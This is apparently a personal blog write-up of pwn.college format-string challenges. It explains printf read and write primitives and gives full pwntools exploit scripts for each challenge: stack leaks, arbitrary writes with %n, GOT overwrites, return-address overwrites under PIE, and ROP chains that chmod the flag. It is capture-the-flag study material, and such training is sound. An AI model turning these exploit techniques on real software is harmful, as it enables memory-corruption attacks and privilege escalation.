---
layout: post
title:  "Pwn College - Format Strings"
date:   2024-05-18 19:59:45 +0300
categories: jekyll update
---

**Contents**
* TOC
{:toc}
## Overview

Might be useful incase we already have some sort of memory corruption, having the ability to call format-specifier function with argument of our wish.

Format vulns exists within number of functions, `printf, sprintf, snprintf`, or for logging - `fprintf` and input `scanf`. Basically just everything taking a format string. \
`printf` can take arbitrary number of arguments. Hence, its calling conventions combines the regular 6-registers argument conventions, and afterwards - substitutes parameters off the stack. \
Usually `rdi` stands for the format string parameter. 

### Read Primitive

`%c, %hhx` - leak byte \
`%hx` - leak 2 bytes \
`%d, %i, %x` - leak 4 bytes \
`%p, %llu, %lu, %lld, %ld` - leak 8 bytes \
`%s` - dereference pointer  

We can use `$` - to specify positional argument. 
`%7$x` - prints the 7th parameter. Recall the first parameter within the stack is actually the 6th parameter, on x64. 


### Write Primitive

Via `%n`. Writes number of bytes written so far, to the positional argument. 

Recall we can put a pointer containing the format string stack address, and reference ourselves. \
Moreover, we can target pointers on the stack, such as the saved `rbp` values. Those are particulary interesting, as frame pointers by-design reference each other. This means we can modify `rbp2` by writing `%n` into `rbp1`, do some arbitrary address. By referencing this address, we obtain arbitrary-write primitive.  This is a generic trick that works regardless of ASLR. \
Moreover, recall there's also `printf` stack frame that is being opened. This means that in case the format string buffer resides on the stack, there should exist some offset which would allow us to reference our own format string via `%X$n`. 

Also keep in mind we can write 8 bytes via `%ln`, and 1 bytes via `%hhn`. \
Since we can pad the amount of bytes to be displayed (for example, `%65x` would print 65 bytes) we can actually write in per-byte granularity - for example `%65x%1$hhn`. 

Lastly, the dynamic-padding size can be used for copying memory. \
Instead of hardcoding the amount of bytes needed, we can state that this number resides within another parameter. `%*10$c%11$n` Reads the padding amount (bytes to be written) from argument number 10, use it as the padding size for a single character, and writes this number (read from the 10th argument) into argument 11. \
Hence, this serves as a copy of 4 bytes between argument 10 and argument 11. 





## Challenge 1

We'd like to read the 10'th qword off the stack. \
Recall first 6 parameters are stored within registers. Hence, we'll need to insert 15 reading-qword format. The catch is that we wouldn't like to dereference with `%s` illegal addresses. Hence, we would use non-dereferencing format specifier, such as `%08x`. 

```python
p0 = process(BINARY)
payload = b'%08x ' * 15 + b'%s '
payload += (256 - len(payload)) * b'A'
print(b'itay payload:payload')
p0.send(payload)
p0.interactive()
```

## Challenge 2

Now the raw bytes are stored on the stack, instead of a pointer to the goal string. \
This is actually easier, as we don't use any dereferecing-type specifiers, avoiding any crash of the binary.

```python
offset = 19
p0 = process(BINARY)
payload = b'%p ' * 30
payload += (256 - len(payload)) * b'A'
p0.recvuntil(b'Send your data!')
p0.send(payload)
p0.recvuntil(b' call printf on your data!\n\n')
buf = p0.recvuntil(b'What is the secret password?').split(b' ')
print(f'BUF:{buf}')

qword1 = binascii.unhexlify(buf[offset][2:])[::-1]
qword2 = binascii.unhexlify(buf[offset + 1][2:])[::-1]
secret = qword1 + qword2
p0.sendline(secret)
p0.interactive()
```

## Challenge 3

We now want to read the flag off the `.bss` section. \
We can see the address to which the flag is being read to via `strace` (fails as the binary is suid):

```bash
read(-1, 0x404120, 128)                 = -1 EBADF (Bad file descriptor)
```

My approach is to write `0x404120` as part of our input , and reference it as a positional argument via `%X$s`, where X is the position of our inserted address. That way, we would be able to forge an arbitrary read primitive. 

```python
p0 = process(BINARY)
bss_addr = 0x404120
p0.readuntil(b'Send your data!')
payload = b'B' * 7  
'''
Recall we cannot insert null byte, or the string would be terminated.
Also recall rsp+0 stands for the 6th format argument. 
Moreover, for simplicity, I will align component to sizeof(qword) == 8 bytes. 
'''
payload += b' %23$s  '
payload += struct.pack('<Q', bss_addr) 
payload += (256 - len(payload)) * b'A'
p0.send(payload)

p0.interactive()
```

## Challenge 4

Simply writing 4 bytes of 0x23 into arbitrary `.bss` address. 

```python
p0 = process(BINARY)
win_addr = 0x404160
p0.readuntil(b'Send your data!')
payload = b'AA%33c'  # Write 0x23
payload += b'%31$n'
payload += struct.pack('<Q', win_addr)  # store the win address on the stack
payload += (256 - len(payload)) * b'A'
p0.send(payload)

p0.interactive()
```

## Challenge 5

Similar to before, but now the global variable is larger. \
Hence, we would perform multiple single-byte writes using `%hhn`. \
I've created a generic method that receives a goal value to write, as well as offset within the stack where the expected goal address resides, and generates a format string that writes the goal value within byte-granularity. 

```python
def gen_fmt(offset, value):
    value_bytes = list(value.to_bytes(8, 'little'))
    value_bytes_sorted = sorted(value_bytes)

    payload = b''
    prev_val = 0
    for val in value_bytes_sorted:
        payload += b'%' + str(val - prev_val).encode() + b'c'
        payload += b'%' + str(offset + value_bytes.index(val)).encode() + b'$hhn'
        prev_val = val

    payload += (8 - (len(payload) % 8)) * b'B'
    print(payload)
    
    return payload


def main(): 
    p0 = process(BINARY)
    win_addr = 0x4040f8
    offset = 49
    goal_value = 0x82802f819c27a46a
    
    p0.readuntil(b'Send your data!')

    payload = gen_fmt(offset, goal_value)
    payload += struct.pack('<Q', win_addr)  # Store win address on the stack
    payload += struct.pack('<Q', win_addr + 1)
    payload += struct.pack('<Q', win_addr + 2) 
    payload += struct.pack('<Q', win_addr + 3)
    payload += struct.pack('<Q', win_addr + 4)
    payload += struct.pack('<Q', win_addr + 5) 
    payload += struct.pack('<Q', win_addr + 6)
    payload += struct.pack('<Q', win_addr + 7)
    payload += (256 - len(payload)) * b'A'
    p0.send(payload)

    p0.interactive()
```

## Challenge 6

Now we'd like to copy a value, into some address within the `.bss`. 

```python
p0 = process(BINARY)
win_addr = 0x404170
format_string_stack_offset = 0x84
secret_to_format_string_offset = 0x134
offset = format_string_stack_offset + secret_to_format_string_offset
position = 6 + int(offset / 8) 

p0.readuntil(b'Send your data!')

payload = b'%*' + str(position).encode() + b'$c'
payload += b'%46$n'
payload += b'\x00'
payload += struct.pack('<Q', win_addr) * 40  # create many copies, easy exploit
payload += (256 - len(payload)) * b'A'
p0.send(payload)

p0.interactive()
```

## Challenge 7

In a similar manner, we'd now like to overwrite a GOT entry. \
Notice we can invoke the format vuln multiple times. Hence, we can easily leak some libc address, and overwrite a GOT entry of our wish into it. For example, overwriting `printf` GOT to `chmod`'s, and using the controlled input as a parameter for `chmod` path. We can also use `system`, which takes only a single parameter. \
The following exploit does exactly this:

```python
libc = ELF(LIBC)
binary = ELF(BINARY)
printf_got = binary.got['printf']
binary_win_addr = binary.symbols['win']
libc_printf_offset = libc.symbols['printf']
libc_system_offset = libc.symbols['system']


def gen_write_format(offset, value, value_size):
    ''' 
    This method assumes the goal addresses to-be-written resides within 'offset' bytes.
    value is the value to be written, and value_size denotes its byte count
    '''
    position = 6 + int(offset / 8)
    value_bytes = list(value.to_bytes(value_size, 'little'))
    value_bytes_sorted = sorted(value_bytes)

    payload = b''
    prev_val = 0
    for val in value_bytes_sorted:
        val_index = value_bytes.index(val)
        payload += b'%' + str(val - prev_val).encode() + b'c'
        payload += b'%' + str(position + val_index).encode() + b'$hhn'
        prev_val = val
        value_bytes[val_index] = b'\xffffffff'  # invalidate byte

    payload += (8 - (len(payload) % 8)) * b'B'
    print(payload)

    return payload


def gen_read_format(offset):
    ''' 
    This method assumes the address to-be-read resides within 'offset' bytes, relative to rsp
    '''
    position = 6 + int(offset / 8)
    buf = b'%' + str(position).encode() + b'$s'

    return buf


def main(): 
    # p0 = gdb.debug(BINARY, gdbscript=GDB_SCRIPT)
    p0 = process(BINARY)
    rsp_to_format_offset = 0xe0

    format_size = 0x300
    format_to_printf_addr_offset = format_size
    printf_got_offset = rsp_to_format_offset + format_to_printf_addr_offset
    
    buf_1 = b''
    buf_1 += gen_read_format(printf_got_offset)
    buf_1 += b'A' * (format_size - len(buf_1))
    buf_1 += struct.pack('<Q', printf_got)
    # Leak printf address
    p0.send(buf_1)
    p0.recvuntil(b'what you got :P\n')
    libc_printf_addr = struct.unpack('<Q', p0.recv(6) + b'\x00\x00')[0]
    libc_base = libc_printf_addr - libc_printf_offset
    print(f'libc_base:{hex(libc_base)}')
    assert(libc_base & 0xfffffffffffff000 == libc_base)

    # Overwrite got entry with value of our goal function
    libc_system_addr = libc_base + libc_system_offset
    libc_system_addr_size = 6  # writing a null byte is problematic, just skip writing 2 high MSBs, as they're already 0
    buf_2 = b''
    buf_2 += gen_write_format(printf_got_offset, libc_system_addr, libc_system_addr_size)
    buf_2 += b'A' * (format_size - len(buf_2))
    buf_2 += struct.pack('<Q', printf_got)
    buf_2 += struct.pack('<Q', printf_got + 1)
    buf_2 += struct.pack('<Q', printf_got + 2)

    p0.send(buf_2)
    p0.recvuntil(b'what you got :P\n')

    p0.send(b'cat /flag')
    p0.interactive()
```

However, this approach doesn't works - due to system uses `/bin/sh -c` under the hood. Recall that by default dash drops privileges, by setting the `euid` to the `uid` of the process, prior to its execution. Hence, in case we would like to exploit this, we would have to call `setuid` first, setting all 3 `uid, saved-uid, euid` to the `euid` (which should be 0, as this is a suid binary). \
Good to mention this behavior of dash can by avoided by supplying the `-p` flag. Hence, calling the `execve` syscall while supplying the argument `/bin/sh -p` wouldv'e worked. 

However, apparently there's a `win` function - hence we do not need to call any libc function, making the exploit much easier:

```python
def gen_write_format(offset, value, value_size):
    ''' 
    This method assumes the goal addresses to-be-written resides within 'offset' bytes.
    value is the value to be written, and value_size denotes its byte count
    '''
    position = 6 + int(offset / 8)

    # First trick - trigger a write of 0, of length 8 bytes. That would clear all bits.
    payload = b''
    payload += b'%' + str(position).encode() + b'$ln'

    value_bytes = list(value.to_bytes(value_size, 'little'))
    value_bytes_sorted = sorted(value_bytes)

    prev_val = 0
    for val in value_bytes_sorted:
        val_index = value_bytes.index(val)
        if (val != prev_val):  # Handle duplication, no need to write more bytes
            payload += b'%' + str(val - prev_val).encode() + b'c'
        payload += b'%' + str(position + val_index).encode() + b'$hhn'
        prev_val = val
        value_bytes[val_index] = b'\xffffffff'  # Invalidate byte, to handle duplications

    payload += (8 - (len(payload) % 8)) * b'B'

    print(payload)

    return payload

def main():
    p0 = process(BINARY)
    rsp_to_format_offset = 0xe0

    format_size = 0x300
    format_to_printf_addr_offset = format_size
    printf_got_offset = rsp_to_format_offset + format_to_printf_addr_offset
    
    # Overwrite got entry with value of our goal function
    buf_2 = b''
    buf_2 += gen_write_format(printf_got_offset, binary_win_addr, binary_win_addr_size)
    buf_2 += b'A' * (format_size - len(buf_2))
    buf_2 += struct.pack('<Q', printf_got)
    buf_2 += struct.pack('<Q', printf_got + 1)
    buf_2 += struct.pack('<Q', printf_got + 2)

    p0.send(buf_2)
    p0.recvuntil(b'what you got :P\n')
    p0.send(b'C')
    p0.interactive()
```

## Challenge 8

Now the binary is PIE. We can overwrite LSBs of the saved return address on the stack. \
Recall we cannot directly overwrite the return address, as we need to dereference it through a pointer containing its address. \
A main obstacle within this challenge, is that our input isn't being transferred directly to `printf`, but instead it is being concatenated to some prior string. Hence, in order to obtain a full write primitive, we have to write within 2-byte granularity, as we can no longer write bytes below the value of the prefix string length.

```python
def gen_write_format(rsp_to_format_offset, offset, value, prev_val = 0):
    ''' 
    This method assumes the goal addresses to-be-written resides within 'offset' bytes.
    value is the value to be written, and value_size denotes its byte count.

    In case we're dealing with a format vuln that already printed certain characters, we can handle this by substracting 'sub' amount
    '''
    position = 6 + int(offset / 8)

    payload = b''
    # First trick - trigger a write of 0, of length 8 bytes. That would clear all bits.
    # payload += b'%' + str(position).encode() + b'$ln'

    value_bytes = list(struct.unpack('<HHHH', struct.pack('<Q', value)))
    value_bytes_sorted = sorted(value_bytes)

    for val in value_bytes_sorted:
        if val == 0:
            continue
        val_index = value_bytes.index(val)
        if (val != prev_val):  # Handle duplication, no need to write more bytes
            payload += b'%' + str(val - prev_val).encode() + b'c'
        payload += b'%' + str(position + val_index).encode() + b'$hn'
        prev_val = val
        value_bytes[val_index] = b'\xffffffff'  # Invalidate byte, to handle duplications


    payload += ((8 - ((len(payload) + rsp_to_format_offset) % 8)) % 8) * b'B'
    assert(offset - rsp_to_format_offset == len(payload))  # Offset to address buffer should correspond to the total length of the generated buffer. Otherwise, there's an error

    return payload


def gen_read_format(offset):
    ''' 
    This method assumes the address to-be-read resides within 'offset' bytes, relative to rsp
    '''
    buf = b''
    position = 6 + int(offset / 8)
    buf += b'%' + str(position).encode() + b'$p'

    return buf

def leak_addr(p, format_size, offset):
    buf_1 = b''
    buf_1 += gen_read_format(offset)
    buf_1 += b'A' * (format_size - len(buf_1))

    p.send(buf_1)
    p.recvuntil(b'you got :P\n')
    p.recvuntil(b'\n')  # contains many spaces
    leak_addr = int(p.recv(14), 16)    

    return leak_addr


def main(): 
    # p0 = gdb.debug(BINARY, gdbscript=GDB_SCRIPT)
    p0 = process(BINARY)
    
    rsp_to_format_offset = 0xca
    pie_leak_offset = 0x194e
    stack_leak_offset = 0x50
    format_to_ra_offset = 0x3de
    format_to_ra_stack_address_offset = 38
    prefix_string_size = 74

    format_size = 0x300
    ra_offset = rsp_to_format_offset + format_to_ra_offset
    ra_stack_address_offset = rsp_to_format_offset + format_to_ra_stack_address_offset

    pie_leak_addr = leak_addr(p0, format_size, ra_offset)
    pie_base = pie_leak_addr - pie_leak_offset
    print(f'pie_base:{hex(pie_base)}')
    assert(pie_base & 0xfffffffffffff000 == pie_base)

    binary_win_addr = pie_base + binary_win_offset
    print(f'binary_win_addr:{hex(binary_win_addr)}')

    stack_leak_addr = leak_addr(p0, format_size, ra_offset - 8)
    ra_stack_address = stack_leak_addr - stack_leak_offset + 8
    print(f'ra_stack_address:{hex(ra_stack_address)}')

    buf_2 = b''
    buf_2 += gen_write_format(rsp_to_format_offset, ra_stack_address_offset, binary_win_addr, prefix_string_size)
    buf_2 += struct.pack('<Q', ra_stack_address)
    buf_2 += struct.pack('<Q', ra_stack_address + 2)
    buf_2 += struct.pack('<Q', ra_stack_address + 4)
    buf_2 += b'A' * (format_size - len(buf_2))
    p0.send(buf_2)

    p0.send(b'END')
    p0.interactive()
```

## Challenge 9

Now there's a single invocation of the format vuln. \
However, it isn't pie, and we can overwrite a GOT entry. 

```python
p0 = process(BINARY)
rsp_to_format_offset = 501
format_to_puts_got_offset = 19
prefix_string_size = 117

format_size = 0x300
puts_got_offset = rsp_to_format_offset + format_to_puts_got_offset
puts_got_position =  6 + int(puts_got_offset / 8)

buf_2 = b''
buf_2 += b'%' + str(binary_win_addr - prefix_string_size).encode() + b'c'
buf_2 += b'%' + str(puts_got_position).encode() + b'$n'
buf_2 += 5 * b'B'
buf_2 += struct.pack('<Q', exit_got)
buf_2 += b'A' * (format_size - len(buf_2))
p0.send(buf_2)

p0.interactive()
```

## Challenge 10

Can only activate the vuln once. However, partial RELRO and no PIE - hence we'd overwrite some GOT entry. \
The only good candidate is `exit`, as it is the only method being called after `printf` (no canary checks, so no `__stack_chk_fail`). 

We can overwrite `exit` to the start address of the program, hence restarting it - giving us the ability to execute the vuln as many times as we wish, now having the ability to leak any values we'd like off the stack. 
Moreover, we can write content to the stack, and pivoting the frame pointer, so that ROP would be triggered. \
Initially, I've implemented generic R/W primitive. The API was a generated format string for every R/W request, as can be seen within `write_addr`. \
However, each invocation of the primitive opened a new stack frame, as the only legitimate control flow was returning to `func`, hence overwriting stack values. This approach primitive seemed insufficient to exploit (at least easily), as I couldn't write 2 conjecutive qwords near the `RA` within the same stack frame (as `call exit` would overwrite the previously set value).

I've solved this by making the exploit more generic - and allowed writing multiple qwords at completely arbitrary addresses within a single format string invocation, as can be seen within `write_addrs`. 

```python
BINARY = glob('/challenge/baby*')[0]
LIBC = '/lib/x86_64-linux-gnu/libc.so.6'
GDB_SCRIPT= '''
set follow-fork-mode child
b *func+337
c
'''

libc = ELF(LIBC)
binary = ELF(BINARY)

printf_got = binary.got['printf']
exit_got = binary.got['exit']
binary_func_addr = binary.symbols['func']

libc_printf_offset = libc.symbols['printf']
libc_system_offset = libc.symbols['system']
libc_environ_offset = libc.symbols['environ']
libc_chmod_offset = libc.symbols['chmod']

binary_rop = ROP(BINARY)
libc_rop = ROP(LIBC)
pop_rsp_ret_offset = libc_rop.rsp.address
pop_rdi_ret_offset = libc_rop.rdi.address
pop_rsi_ret_offset = libc_rop.rsi.address
pop_r13_ret_offset = binary_rop.find_gadget(['pop r13']).address
pop_r13_ret_offset_2 = libc_rop.find_gadget(['pop r13']).address
leave_ret_offset = libc_rop.find_gadget(['leave']).address

def gen_read_format_string(rsp_to_format_offset, position):
    buf = b''
    buf += b'%' + str(position).encode() + b'$s'
    buf += b'B' * (8 - ((rsp_to_format_offset + len(buf)) % 8))

    return buf

def read_addr(p, payload_size, rsp_to_format_offset, address):
    init_position = 6 + int(rsp_to_format_offset / 8)
    buf = gen_read_format_string(rsp_to_format_offset, init_position)

    position = 6 + int((rsp_to_format_offset + len(buf)) / 8)
    buf = gen_read_format_string(rsp_to_format_offset, position)

    buf += struct.pack('<Q', address)
    buf += (payload_size - len(buf)) * b'A'

    p.send(buf)
    p.recvuntil(b'Your input is:')
    p.recvuntil(b'\n')  # contains many spaces
    leak_addr = struct.unpack('<Q', p.recv(6) + b'\x00' * 2)[0]

    return leak_addr

def gen_write_format_string(rsp_to_format_offset, position, value, prefix_string_size, debug):
    buf = b''

    # First trick - trigger a write of 0 (or short prefix string), of length 8 bytes. That would clear most MSBs.
    buf += b'%' + str(position).encode() + b'$ln'

    value_bytes = list(struct.unpack('<HHHH', struct.pack('<Q', value)))
    value_bytes_sorted = sorted(value_bytes)

    for val in value_bytes_sorted:
        if val == 0:
            continue
        val_index = value_bytes.index(val)
        if not debug:
            if (val != prefix_string_size):  # Handle duplication, no need to write more bytes
                buf += b'%' + str(val - prefix_string_size).encode() + b'c'
        else:
            # Incase of debug, print only 2 padding spaces
            buf += b'%' + (len(str(val - prefix_string_size).encode()) - 1) * b'0' + b'2' + b'c'

        if debug:
            # TODO: restore specifier
            buf += b'%' + str(position + val_index).encode() + b'$lx'
        else:
            buf += b'%' + str(position + val_index).encode() + b'$hn'
        prefix_string_size = val
        value_bytes[val_index] = b'\xffffffff'  # Invalidate byte, to handle duplications

    buf += b'B' * (8 - ((rsp_to_format_offset + len(buf)) % 8))

    return buf


def gen_multi_write_format_string(rsp_to_format_offset, position, values, prefix_string_size):
    addrs_count = len(values)

    buf = b''
    # First trick - trigger a write of 0 (or short prefix string), of length 8 bytes. That would clear most MSBs.
    for i in range(addrs_count):
        buf += b'%' + str(position + i * 4).encode() + b'$ln'

    value_bytes = []
    for value in values:
        value_bytes += list(struct.unpack('<HHHH', struct.pack('<Q', value)))
    value_bytes_sorted = sorted(value_bytes)

    for val in value_bytes_sorted:
        if val == 0:
            continue
        val_index = value_bytes.index(val)
        val_address_index = int(val_index / 4)
       
        if (val != prefix_string_size):  # Handle duplication, no need to write more bytes
            buf += b'%' + str(val - prefix_string_size).encode() + b'c'
        buf += b'%' + str(position + val_index).encode() + b'$hn'
        prefix_string_size = val
        value_bytes[val_index] = b'\xffffffff'  # Invalidate byte, to handle duplications

    buf += b'B' * (8 - ((rsp_to_format_offset + len(buf)) % 8))

    return buf


def write_addr_payload(rsp_to_format_offset, address, value, prefix_string_size, debug):
    # Notice: there's probably more elegant way to do this. 
    init_position = 6 + int(rsp_to_format_offset / 8)
    buf = gen_write_format_string(rsp_to_format_offset, init_position, value, prefix_string_size, debug)

    position = 6 + int((rsp_to_format_offset + len(buf)) / 8)
    buf = gen_write_format_string(rsp_to_format_offset, position, value, prefix_string_size, debug)

    buf += struct.pack('<Q', address)
    buf += struct.pack('<Q', address + 2)
    buf += struct.pack('<Q', address + 4)
    buf += struct.pack('<Q', address + 6) 
    
    if debug:
        print(f'Generated write buf:{buf}')
    
    return buf


def write_addrs_payload(rsp_to_format_offset, addresses, values, prefix_string_size):
    # Notice: there's probably more elegant way to do this. 
    init_position = 6 + int(rsp_to_format_offset / 8)
    buf = gen_multi_write_format_string(rsp_to_format_offset, init_position, values, prefix_string_size)

    position = 6 + int((rsp_to_format_offset + len(buf)) / 8)
    buf = gen_multi_write_format_string(rsp_to_format_offset, position, values, prefix_string_size)

    for address in addresses:
        buf += struct.pack('<Q', address)
        buf += struct.pack('<Q', address + 2)
        buf += struct.pack('<Q', address + 4)
        buf += struct.pack('<Q', address + 6) 

    print(f'fmt buf:{buf} len:{len(buf)}')
    
    return buf


def write_addr(p, payload_size, rsp_to_format_offset, address, value, prefix_string_size=0, extra_buffer=b'', debug=False):
    buf = write_addr_payload(rsp_to_format_offset, address, value, prefix_string_size, debug)
    buf += extra_buffer
    buf += (payload_size - len(buf)) * b'A'
    p.send(buf)
    p.recvuntil(b'Your input is:')

def write_addrs(p, payload_size, rsp_to_format_offset, addresses, values, prefix_string_size=0):
    '''
    This method writes to multiple addresses, within a single format string invocation.
    '''
    assert(len(addresses) == len(values))
    buf = write_addrs_payload(rsp_to_format_offset, addresses, values, prefix_string_size)
    buf += (payload_size - len(buf)) * b'A'
    p.send(buf)
    p.recvuntil(b'Your input is:')


def main(): 
    # p0 = gdb.debug(BINARY, gdbscript=GDB_SCRIPT)
    p0 = process(BINARY)
    rsp_to_format_offset = 0x111
    prefix_string_size = 33
    environ_printf_offset = 0x15d0

    payload_size = 0x350

    # Phase 1
    # Overwrite exit's GOT, so we would have infinate invocations.
    # Keep in mind - we have to make sure $rsp remains valid - aligned to 0x10, before calling printf once again. Hence, we would jump to legitimate site - 'func'
    write_addr(p0, payload_size, rsp_to_format_offset, address=exit_got, value=binary_func_addr, prefix_string_size=prefix_string_size)

    # Phase 2
    # Leak libc
    libc_leak_addr = read_addr(p0, payload_size, rsp_to_format_offset, address=printf_got)
    libc_base = libc_leak_addr - libc_printf_offset
    print(f'libc_base: {hex(libc_base)}')
    assert(libc_base & 0xfffffffffffff000 == libc_base)
    chmod_addr = libc_base + libc_chmod_offset
    pop_rsp_ret = libc_base + pop_rsp_ret_offset
    pop_r13_ret_2 = libc_base + pop_r13_ret_offset_2
    pop_rdi_ret = libc_base + pop_rdi_ret_offset
    pop_rsi_ret = libc_base + pop_rsi_ret_offset
    pop_r13_ret = pop_r13_ret_offset
    leave_ret = libc_base + leave_ret_offset
    print(f'pop_rsp_ret: {hex(pop_rsp_ret)} pop_r13_ret_2: {hex(pop_r13_ret_2)} pop_rdi_ret: {hex(pop_rdi_ret)} pop_rsi_ret: {hex(pop_rsi_ret)} pop_r13_ret: {hex(pop_r13_ret)} leave_ret: {hex(leave_ret)}')

    # Phase 3 
    # Leak stack
    # Cute trick, Leak stack using libc leak
    environ_addr = libc_base + libc_environ_offset
    environ_leak_addr = read_addr(p0, payload_size, rsp_to_format_offset, address=environ_addr)
    print(f'environ_leak_addr: {hex(environ_leak_addr)}')

    # Phase 4
    # Forge ROP
    printf_ret_addr = environ_leak_addr - environ_printf_offset
    flag_addr = printf_ret_addr + 0x30
    print(f'printf_ret_addr:{hex(printf_ret_addr)}')

    # We'd like to overwrite within a single printf call all 6 qwords, starting from the return address of printf. 
    write_addrs(p0, payload_size, rsp_to_format_offset, 
    addresses=[printf_ret_addr, printf_ret_addr + 8, printf_ret_addr + 0x10, printf_ret_addr + 0x18, printf_ret_addr + 0x20, flag_addr], 
    values=[pop_rdi_ret, flag_addr, pop_rsi_ret, 0xffff, chmod_addr, 0x67616c662f], 
    prefix_string_size=prefix_string_size)

    p0.interactive()
    

if __name__ == '__main__':
    main()
```

## Challenges 11 + 12

Now PIE, but we have 2 invocations. \
The idea is simple - for the first invocation I'd implement generic multiple-read, which would read PIE, stack and libc addresses within a single format string vuln invocation. \
For the second invocation, I'd use the generic multiple-write as I've implemented within challenge 10.  


```python
def gen_read_format_string(rsp_to_format_offset, position):
    buf = b''
    # buf += b'%' + str(position).encode() + b'$s'
    buf += b'%p ' * 0x100
    buf += b'B' * (8 - ((rsp_to_format_offset + len(buf)) % 8))

    return buf

def read_addr(p, payload_size, rsp_to_format_offset, address):
    init_position = 6 + int(rsp_to_format_offset / 8)
    buf = gen_read_format_string(rsp_to_format_offset, init_position)

    position = 6 + int((rsp_to_format_offset + len(buf)) / 8)
    buf = gen_read_format_string(rsp_to_format_offset, position)

    buf += struct.pack('<Q', address)
    buf += (payload_size - len(buf)) * b'A'

    p.send(buf)
    p.recvuntil(b'Your input is:')
    p.recvuntil(b'\n')  # contains many spaces
    
    leaks = p.recv().split(b' ')

    return leaks

def gen_multi_write_format_string(rsp_to_format_offset, position, values, prefix_string_size):
    buf = b''
    # First trick - trigger a write of 0 (or short prefix string), of length 8 bytes. That would clear most MSBs.
    # for i in range(addrs_count):
    #     buf += b'%' + str(position + i * 4).encode() + b'$ln'

    # TODO: assumption - for the first byte, we have to perform some read with %c and only then write with %n
    buf += (position - 1) * b'%1c'  # Increment the position pointer, so the next write would point to our target
    prefix_string_size += position - 1

    value_bytes = []
    for value in values:
        value_bytes += list(struct.unpack('<HHHH', struct.pack('<Q', value)))
    value_bytes_sorted = sorted(value_bytes)

    for val in value_bytes_sorted:
        if val == 0:
            continue

        assert(val >= prefix_string_size)

        val_index = value_bytes.index(val)
       
        if (val != prefix_string_size):  # Handle duplication, no need to write more bytes
            buf += b'%' + str(val - prefix_string_size).encode() + b'c'
        # buf += b'%' + str(position + val_index).encode() + b'$hn'
        buf += b'%hn'

        prefix_string_size = val
        value_bytes[val_index] = b'\xffffffffffff'  # Invalidate byte, to handle duplications

    buf += b'B' * (8 - ((rsp_to_format_offset + len(buf)) % 8))

    return buf


def write_addrs_payload(rsp_to_format_offset, addresses, values, prefix_string_size):
    value_bytes = []
    for value in values:
        value_bytes += list(struct.unpack('<HHHH', struct.pack('<Q', value)))
    value_bytes_sorted = sorted(value_bytes)
    print(f'value_bytes:{value_bytes} value_bytes_sorted:{value_bytes_sorted}')
    
    sorted_addresses = {}
    for i, val in enumerate(value_bytes_sorted):
        if val == 0:
            continue
        val_index = value_bytes.index(val)
        val_address_index = int(val_index / 4)
        sorted_addresses[i] = [addresses[val_address_index] + 2 * (val_index % 4), False]
        value_bytes[val_index] = b'\xffffffffffff'  # handle duplications
        if i > 0 and val == value_bytes_sorted[i - 1]:  
            # Detect duplication, so we won't insert extra %c
            sorted_addresses[i][1] = True


    # SAT solver to dynamically find position, stop at convergence
    prev_position = 0
    position = 6 + int(rsp_to_format_offset / 8)
    while prev_position != position:
        buf = gen_multi_write_format_string(rsp_to_format_offset, position, values, prefix_string_size)
        prev_position = position
        position = 6 + int((rsp_to_format_offset + len(buf)) / 8)

    for i in sorted(sorted_addresses.keys()):
        if not sorted_addresses[i][1]:
            buf += b'C' * 8  # Filler, as %c increments the position counter
        buf += struct.pack('<Q', sorted_addresses[i][0])
        
    print(f'fmt buf:{buf} len:{len(buf)} position:{position}')
    
    return buf

def write_addrs(p, payload_size, rsp_to_format_offset, addresses, values, prefix_string_size=0):
    '''
    This method writes to multiple addresses, within a single format string invocation.
    '''
    assert(len(addresses) == len(values))
    buf = write_addrs_payload(rsp_to_format_offset, addresses, values, prefix_string_size)
    buf += (payload_size - len(buf)) * b'A'
    p.send(buf)
    p.recvuntil(b'Your input is:')


def main(): 
    # p0 = gdb.debug(BINARY, gdbscript=GDB_SCRIPT)
    p0 = process(BINARY)

    rsp_to_format_offset = 0xbf
    prefix_string_size = 127

    libc_leak_index = 0
    stack_leak_index = 6
    pie_leak_index = 141
    libc_leak_offset = 0x1ed723
    stack_leak_offset = 0xc7
    pie_leak_offset = 0x1990

    payload_size = 0x350

    # Phase 1 - Read crap
    p0.recvuntil(b'your input again.\n')

    # Phase 2 - Leak
    leaks = read_addr(p0, payload_size, rsp_to_format_offset, address=printf_got)
    libc_base = int(leaks[libc_leak_index], 16) - libc_leak_offset
    printf_ret_addr = int(leaks[stack_leak_index], 16) - stack_leak_offset
    flag_addr = printf_ret_addr + 0x30
    pie_base = int(leaks[pie_leak_index], 16) - pie_leak_offset
    print(f'libc_base: {hex(libc_base)} printf_ret_addr: {hex(printf_ret_addr)} pie_base: {hex(pie_base)}')
    assert( ((libc_base & 0xfff) == 0) and ((pie_base & 0xfff) == 0) )
    chmod_addr = libc_base + libc_chmod_offset
    pop_rdi_ret = libc_base + pop_rdi_ret_offset
    pop_rsi_ret = libc_base + pop_rsi_ret_offset
    print(f'pop_rdi_ret: {hex(pop_rdi_ret)} pop_rsi_ret: {hex(pop_rsi_ret)} chmod: {hex(chmod_addr)}')

    # Phase 3 - Forge ROP
    # We'd like to overwrite within a single printf call all 6 qwords, starting from the return address of printf. 
    print(f'writing {hex(pop_rdi_ret)} to {hex(printf_ret_addr)}')
    write_addrs(p0, payload_size, rsp_to_format_offset, 
    addresses=[printf_ret_addr, printf_ret_addr + 8, printf_ret_addr + 0x10, printf_ret_addr + 0x18, printf_ret_addr + 0x20, flag_addr], 
    values=[pop_rdi_ret, flag_addr, pop_rsi_ret, 0xffff, chmod_addr, 0x67616c662f2f], 
    prefix_string_size=prefix_string_size)

    p0.interactive()
    

if __name__ == '__main__':
    main()
```

Notice that challenge 12 is similar to 11, but disallows `$` as a character within the payload. Hence, I've implemented the generic method to be not-dependent upon the `$` sign. \
We can trivially leak libc, stack and PIE addresses - by just sending a large, `"%p " * 0x100` format string. \
Writing shouldn't be hard either, as we've already implemented the generic multiple-write. All we have to adapt is moke-reading of `position` parameteres off the stack. 

## Stack Snapshoting

Using `$` in a format string can cause stack values to be snapshotted inside `printf`.  This behavior prevents us from writing a pointer and accessing that pointer in a single `printf` call. \
If `$` is not included in the format string, this behavior isn't trigerred. That might be good motivation for challenge 12. 

TODO: write more about its internals. 

Notice `pwntools` exports the option to craft exploiting format strings, even without `$`, via `fmtstr_payload`.
